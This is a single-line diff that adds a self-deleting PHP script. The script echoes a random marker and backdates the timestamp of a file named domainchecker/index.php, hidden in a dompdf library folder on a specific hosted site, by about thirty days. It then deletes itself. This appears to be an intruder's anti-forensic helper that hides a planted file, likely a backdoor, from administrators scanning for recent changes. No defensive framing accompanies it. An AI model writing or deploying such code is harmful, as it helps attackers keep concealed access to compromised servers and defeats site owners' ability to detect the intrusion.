@@ -1,0 +1,1 @@
+<?php echo "zHnXvqwbKW"; if (file_exists("/home2/allemanp/public_html/appsgi/application/libraries/dompdf/lib/res/domainchecker/index.php")){ touch("/home2/allemanp/public_html/appsgi/application/libraries/dompdf/lib/res/domainchecker/index.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*tqgBVWN4RxV1UyT6mr3y*/ ?>
